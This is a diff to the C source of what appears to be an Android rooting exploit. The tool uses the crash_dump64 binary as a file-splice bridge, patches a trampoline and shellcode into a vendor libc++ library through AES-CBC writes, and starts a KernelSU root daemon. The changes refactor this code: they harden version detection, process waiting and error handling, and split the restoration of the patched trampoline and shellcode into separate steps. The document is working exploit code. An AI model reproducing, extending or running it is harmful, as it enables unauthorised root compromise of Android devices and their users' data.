@@ -16,8 +16,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include "aes256.h"
-
-#define eos(s) (s + strlen(s))
+#include "native_safety.h"
 
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
@@ -54,7 +53,7 @@ static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16],
 
 /* vfork + exec crash_dump64 (splicehelper); dup2 write_fd onto target_fd in child.
  * Pass mode="r" for read, NULL for write-splice.
- * Returns waitpid status, or -1 if clone fails (already logged).
+ * Returns waitpid status, or -1 if clone or waiting fails (already logged).
  */
 static int spawn_crash_dump(off_t offset, int write_fd, int target_fd, const char *mode)
 {
@@ -70,9 +69,9 @@ static int spawn_crash_dump(off_t offset, int write_fd, int target_fd, const cha
             execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
         _exit(1);
     }
-    int st = 0;
-    TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
-    return st;
+    int status = native_wait_status(pid, waitpid);
+    if (status < 0) printf("waitpid failed: %s\n", strerror(errno));
+    return status;
 }
 
 /* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
@@ -303,25 +302,10 @@ static const struct KoImage *select_ko_image(int andr, int major, int minor) {
 static int read_device_versions(int *andr, int *major, int *minor) {
     struct utsname u;
     if (uname(&u) != 0) return -1;
-    if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
-    const char *m = strstr(u.release, "android");
-    if (!m) {
+    if (native_kernel_version(u.release, major, minor)) return -1;
+    if (!strstr(u.release, "android"))
         printf("uname -r is missing Android version, trying getprop\n");
-
-        char vendor_ver[5];
-        char release[15];
-
-        FILE *f = popen("getprop ro.vendor.build.version.release", "r");
-        fgets(vendor_ver, sizeof(vendor_ver), f);
-        pclose(f);
-
-        sprintf(release, "android");
-        sprintf(eos(release), "%s", vendor_ver);
-
-        m = release;
-    }
-    *andr = atoi(m + 7);
-    return (*andr > 0) ? 0 : -1;
+    return native_android_version(u.release, andr, popen, fgets, pclose);
 }
 
 /* Pad payload to a multiple of 16 bytes in a heap buffer. Caller must free(). */
@@ -381,15 +365,33 @@ static int patch_ko(void) {
     return ret;
 }
 
-static void cleanup(void) {
-    if (!g_libcxx_r.valid) return;
+static int restore_trampoline(void *context) {
+    struct PatchRestore *restore = context;
+    printf("restoring trampoline in %s\n", restore->lib);
+    int result = patch_file_cbc(restore->lib, (char *)restore->tramp_orig, 16,
+                               (size_t)restore->tramp_aligned, 0);
+    if (result)
+        printf("cleanup: ERROR - trampoline restore failed (%d); "
+               "skipping dependent payload restore\n", result);
+    return result;
+}
+
+static int restore_payload(void *context) {
+    struct PatchRestore *restore = context;
+    printf("restoring shellcode in %s\n", restore->lib);
+    int result = patch_file_cbc(restore->lib, restore->shell_orig, restore->shell_padded,
+                               (size_t)restore->shell_off, 0);
+    if (result)
+        printf("cleanup: ERROR - payload restore failed (%d)\n", result);
+    return result;
+}
+
+static int cleanup(void) {
+    if (!g_libcxx_r.valid) return NATIVE_RESTORE_OK;
     printf("\n=== cleanup ===\n");
-    printf("restoring trampoline in %s\n", g_libcxx_r.lib);
-    patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,
-                   (size_t)g_libcxx_r.tramp_aligned, 0);
-    printf("restoring shellcode in %s\n", g_libcxx_r.lib);
-    patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
-                   (size_t)g_libcxx_r.shell_off, 0);
+    int result = native_restore_in_order(restore_trampoline, restore_payload, &g_libcxx_r);
+    if (result == NATIVE_RESTORE_OK) g_libcxx_r.valid = 0;
+    return result;
 }
 
 int find_hook_target(const char *lib, const char *sym,
@@ -462,10 +464,16 @@ static int createOrphanProcess(void) {
     if (pid < 0) { printf("Failed to create orphan: %s\n", strerror(errno)); return -1; }
     if (pid == 0) {
         int pid2 = fork();
+        if (pid2 < 0) _exit(1);
         if (pid2 == 0) { sleep(1); _exit(0); }
         _exit(0);
     }
-    TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
+    int status = native_wait_status(pid, waitpid);
+    if (status < 0) {
+        printf("Failed to wait for orphan launcher: %s\n", strerror(errno));
+        return -1;
+    }
+    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) return -1;
     return 0;
 }
 
@@ -552,7 +560,10 @@ static int exploit(void) {
     usleep(500000);
     
     printf("\n=== init  ===\n");
-    createOrphanProcess();
+    if (createOrphanProcess()) {
+        printf("bootstrap: ERROR - launcher process failed\n");
+        goto done;
+    }
 
     static const struct {
         const char *path;
@@ -570,8 +581,8 @@ static int exploit(void) {
         { "/dev/dfm4",  "bootstrap: disabling ksu modules",                 -1 },
         { "/dev/dfme1", "bootstrap: ERROR - disable modules failed",         1 },
         { "/dev/dfm5",  "bootstrap: starting SU daemon",                    -1 },
-        { "/dev/dfm6",  "ksud start: SUCCESS",                               0 },
-        { "/dev/dfme2", "ksud start: ERROR - ksud nonzero exit",             1 },
+        { "/dev/dfm6",  "bootstrap: launcher returned; root unverified",       0 },
+        { "/dev/dfme2", "bootstrap: ERROR - launcher failed",                  1 },
     };
     int seen[sizeof(markers)/sizeof(markers[0])] = {0};
 
@@ -595,6 +606,8 @@ int main(int argc, char **argv) {
     setvbuf(stdout, NULL, _IONBF, 0);
     if (setup(argc, argv) != 0) return 2;
     int rc = exploit();
-    cleanup();
-    return rc;
+    int restore_status = cleanup();
+    if (restore_status != NATIVE_RESTORE_OK)
+        printf("cleanup: ERROR - restoration incomplete; exiting with status 4\n");
+    return native_exit_status(rc, restore_status);
 }
